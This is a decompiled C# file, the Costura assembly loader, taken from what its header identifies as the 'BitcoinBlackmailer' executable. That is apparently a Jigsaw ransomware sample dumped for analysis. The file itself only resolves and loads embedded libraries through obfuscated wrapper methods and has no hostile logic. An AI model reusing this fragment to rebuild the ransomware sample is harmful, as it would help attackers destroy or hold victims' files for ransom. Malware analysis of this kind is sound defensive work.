// Decompiled with JetBrains decompiler
// Type: Costura.AssemblyLoader
// Assembly: BitcoinBlackmailer, Version=37.0.2.5583, Culture=neutral, PublicKeyToken=null
// MVID: 628485CE-1750-4702-9367-C5FFF8321F79
// Assembly location: C:\Users\IEUser\Desktop\clean\jigsaw-tamp2-cleaned.exe

using System;
using System.Collections.Generic;
using System.Globalization;
using System.IO;
using System.IO.Compression;
using System.Reflection;
using System.Runtime.CompilerServices;

namespace Costura
{
  [CompilerGenerated]
  internal static class AssemblyLoader
  {
    private static readonly Dictionary<string, bool> nullCache = new Dictionary<string, bool>();
    private static readonly Dictionary<string, string> assemblyNames = new Dictionary<string, string>();
    private static readonly Dictionary<string, string> symbolNames = new Dictionary<string, string>();
    private static ResolveEventHandler CS\u0024\u003C\u003E9__CachedAnonymousMethodDelegate1;

    private static string CultureToString(CultureInfo culture) => culture == null ? "" : AssemblyLoader.smethod_0(culture);

    private static Assembly ReadExistingAssembly(AssemblyName name)
    {
      // ISSUE: reference to a compiler-generated method
      // ISSUE: reference to a compiler-generated method
      foreach (Assembly assembly_0 in AssemblyLoader.smethod_2(AssemblyLoader.smethod_1()))
      {
        // ISSUE: reference to a compiler-generated method
        AssemblyName assemblyName_0 = AssemblyLoader.smethod_3(assembly_0);
        // ISSUE: reference to a compiler-generated method
        // ISSUE: reference to a compiler-generated method
        // ISSUE: reference to a compiler-generated method
        // ISSUE: reference to a compiler-generated method
        // ISSUE: reference to a compiler-generated method
        // ISSUE: reference to a compiler-generated method
        // ISSUE: reference to a compiler-generated method
        // ISSUE: reference to a compiler-generated method
        if (AssemblyLoader.smethod_5(AssemblyLoader.smethod_4(assemblyName_0), AssemblyLoader.smethod_4(name), StringComparison.InvariantCultureIgnoreCase) && AssemblyLoader.smethod_5(AssemblyLoader.CultureToString(AssemblyLoader.smethod_6(assemblyName_0)), AssemblyLoader.CultureToString(AssemblyLoader.smethod_6(name)), StringComparison.InvariantCultureIgnoreCase))
          return assembly_0;
      }
      return (Assembly) null;
    }

    private static void CopyTo(Stream source, Stream destination)
    {
      byte[] byte_0 = new byte[81920];
      int int_1;
      // ISSUE: reference to a compiler-generated method
      while ((int_1 = AssemblyLoader.smethod_8(source, byte_0, 0, byte_0.Length)) != 0)
      {
        // ISSUE: reference to a compiler-generated method
        AssemblyLoader.smethod_7(destination, byte_0, 0, int_1);
      }
    }

    private static Stream LoadStream(string fullname)
    {
      // ISSUE: reference to a compiler-generated method
      Assembly assembly_0 = AssemblyLoader.smethod_9();
      // ISSUE: reference to a compiler-generated method
      if (!AssemblyLoader.smethod_10(fullname, ".zip"))
      {
        // ISSUE: reference to a compiler-generated method
        return AssemblyLoader.smethod_11(assembly_0, fullname);
      }
      // ISSUE: reference to a compiler-generated method
      Stream stream = AssemblyLoader.smethod_11(assembly_0, fullname);
      try
      {
        // ISSUE: reference to a compiler-generated method
        DeflateStream deflateStream = AssemblyLoader.smethod_12(stream, CompressionMode.Decompress);
        try
        {
          // ISSUE: reference to a compiler-generated method
          MemoryStream memoryStream = AssemblyLoader.smethod_13();
          // ISSUE: reference to a compiler-generated method
          AssemblyLoader.CopyTo((Stream) deflateStream, (Stream) memoryStream);
          // ISSUE: reference to a compiler-generated method
          AssemblyLoader.smethod_14((Stream) memoryStream, 0L);
          return (Stream) memoryStream;
        }
        finally
        {
          if (deflateStream != null)
          {
            // ISSUE: reference to a compiler-generated method
            AssemblyLoader.smethod_15((IDisposable) deflateStream);
          }
        }
      }
      finally
      {
        if (stream != null)
        {
          // ISSUE: reference to a compiler-generated method
          AssemblyLoader.smethod_15((IDisposable) stream);
        }
      }
    }

    private static Stream LoadStream(Dictionary<string, string> resourceNames, string name)
    {
      string fullname;
      // ISSUE: reference to a compiler-generated method
      return resourceNames.TryGetValue(name, out fullname) ? AssemblyLoader.LoadStream(fullname) : (Stream) null;
    }

    private static byte[] ReadStream(Stream stream)
    {
      // ISSUE: reference to a compiler-generated method
      byte[] byte_0 = new byte[AssemblyLoader.smethod_16(stream)];
      // ISSUE: reference to a compiler-generated method
      AssemblyLoader.smethod_8(stream, byte_0, 0, byte_0.Length);
      return byte_0;
    }

    private static Assembly ReadFromEmbeddedResources(
      Dictionary<string, string> assemblyNames,
      Dictionary<string, string> symbolNames,
      AssemblyName requestedAssemblyName)
    {
      // ISSUE: reference to a compiler-generated method
      // ISSUE: reference to a compiler-generated method
      string str = AssemblyLoader.smethod_17(AssemblyLoader.smethod_4(requestedAssemblyName));
      // ISSUE: reference to a compiler-generated method
      // ISSUE: reference to a compiler-generated method
      // ISSUE: reference to a compiler-generated method
      // ISSUE: reference to a compiler-generated method
      if (AssemblyLoader.smethod_6(requestedAssemblyName) != null && !AssemblyLoader.smethod_18(AssemblyLoader.smethod_0(AssemblyLoader.smethod_6(requestedAssemblyName))))
      {
        // ISSUE: reference to a compiler-generated method
        // ISSUE: reference to a compiler-generated method
        // ISSUE: reference to a compiler-generated method
        str = AssemblyLoader.smethod_19("{0}.{1}", (object) AssemblyLoader.smethod_0(AssemblyLoader.smethod_6(requestedAssemblyName)), (object) str);
      }
      // ISSUE: reference to a compiler-generated method
      Stream stream1 = AssemblyLoader.LoadStream(assemblyNames, str);
      byte[] byte_0;
      try
      {
        if (stream1 == null)
          return (Assembly) null;
        // ISSUE: reference to a compiler-generated method
        byte_0 = AssemblyLoader.ReadStream(stream1);
      }
      finally
      {
        if (stream1 != null)
        {
          // ISSUE: reference to a compiler-generated method
          AssemblyLoader.smethod_15((IDisposable) stream1);
        }
      }
      // ISSUE: reference to a compiler-generated method
      Stream stream2 = AssemblyLoader.LoadStream(symbolNames, str);
      try
      {
        if (stream2 != null)
        {
          // ISSUE: reference to a compiler-generated method
          byte[] byte_1 = AssemblyLoader.ReadStream(stream2);
          // ISSUE: reference to a compiler-generated method
          return AssemblyLoader.smethod_20(byte_0, byte_1);
        }
      }
      finally
      {
        if (stream2 != null)
        {
          // ISSUE: reference to a compiler-generated method
          AssemblyLoader.smethod_15((IDisposable) stream2);
        }
      }
      // ISSUE: reference to a compiler-generated method
      return AssemblyLoader.smethod_21(byte_0);
    }

    public static Assembly ResolveAssembly(string assemblyName)
    {
      // ISSUE: reference to a compiler-generated field
      if (AssemblyLoader.nullCache.ContainsKey(assemblyName))
        return (Assembly) null;
      // ISSUE: reference to a compiler-generated method
      AssemblyName assemblyName1 = AssemblyLoader.smethod_22(assemblyName);
      // ISSUE: reference to a compiler-generated method
      Assembly assembly1 = AssemblyLoader.ReadExistingAssembly(assemblyName1);
      if (assembly1 != null)
        return assembly1;
      // ISSUE: reference to a compiler-generated field
      // ISSUE: reference to a compiler-generated field
      // ISSUE: reference to a compiler-generated method
      Assembly assembly2 = AssemblyLoader.ReadFromEmbeddedResources(AssemblyLoader.assemblyNames, AssemblyLoader.symbolNames, assemblyName1);
      if (assembly2 == null)
      {
        // ISSUE: reference to a compiler-generated field
        AssemblyLoader.nullCache.Add(assemblyName, true);
        // ISSUE: reference to a compiler-generated method
        if (AssemblyLoader.smethod_23(assemblyName1) == AssemblyNameFlags.Retargetable)
        {
          // ISSUE: reference to a compiler-generated method
          assembly2 = AssemblyLoader.smethod_24(assemblyName1);
        }
      }
      return assembly2;
    }

    static AssemblyLoader() => AssemblyLoader.assemblyNames.Add("newtonsoft.json", "costura.newtonsoft.json.dll.zip");

    private static Assembly \u003CAttach\u003Eb__0(object s, ResolveEventArgs e) => AssemblyLoader.ResolveAssembly(AssemblyLoader.smethod_25(e));

    public static void Attach() => AssemblyLoader.smethod_26(AssemblyLoader.smethod_1(), (ResolveEventHandler) ((s, e) => AssemblyLoader.ResolveAssembly(AssemblyLoader.smethod_25(e))));

    static string smethod_0(CultureInfo cultureInfo_0) => cultureInfo_0.Name;

    static AppDomain smethod_1() => AppDomain.CurrentDomain;

    static Assembly[] smethod_2(AppDomain appDomain_0) => appDomain_0.GetAssemblies();

    static AssemblyName smethod_3(Assembly assembly_0) => assembly_0.GetName();

    static string smethod_4(AssemblyName assemblyName_0) => assemblyName_0.Name;

    static bool smethod_5(string string_0, string string_1, StringComparison stringComparison_0) => string.Equals(string_0, string_1, stringComparison_0);

    static CultureInfo smethod_6(AssemblyName assemblyName_0) => assemblyName_0.CultureInfo;

    static void smethod_7(Stream stream_0, byte[] byte_0, int int_0, int int_1) => stream_0.Write(byte_0, int_0, int_1);

    static int smethod_8(Stream stream_0, byte[] byte_0, int int_0, int int_1) => stream_0.Read(byte_0, int_0, int_1);

    static Assembly smethod_9() => Assembly.GetExecutingAssembly();

    static bool smethod_10(string string_0, string string_1) => string_0.EndsWith(string_1);

    static Stream smethod_11(Assembly assembly_0, string string_0) => assembly_0.GetManifestResourceStream(string_0);

    static DeflateStream smethod_12(Stream stream_0, CompressionMode compressionMode_0) => new DeflateStream(stream_0, compressionMode_0);

    static MemoryStream smethod_13() => new MemoryStream();

    static void smethod_14(Stream stream_0, long long_0) => stream_0.Position = long_0;

    static void smethod_15(IDisposable idisposable_0) => idisposable_0.Dispose();

    static long smethod_16(Stream stream_0) => stream_0.Length;

    static string smethod_17(string string_0) => string_0.ToLowerInvariant();

    static bool smethod_18(string string_0) => string.IsNullOrEmpty(string_0);

    static string smethod_19(string string_0, object object_0, object object_1) => string.Format(string_0, object_0, object_1);

    static Assembly smethod_20(byte[] byte_0, byte[] byte_1) => Assembly.Load(byte_0, byte_1);

    static Assembly smethod_21(byte[] byte_0) => Assembly.Load(byte_0);

    static AssemblyName smethod_22(string string_0) => new AssemblyName(string_0);

    static AssemblyNameFlags smethod_23(AssemblyName assemblyName_0) => assemblyName_0.Flags;

    static Assembly smethod_24(AssemblyName assemblyName_0) => Assembly.Load(assemblyName_0);

    static string smethod_25(ResolveEventArgs resolveEventArgs_0) => resolveEventArgs_0.Name;

    static void smethod_26(AppDomain appDomain_0, ResolveEventHandler resolveEventHandler_0) => appDomain_0.AssemblyResolve += resolveEventHandler_0;
  }
}
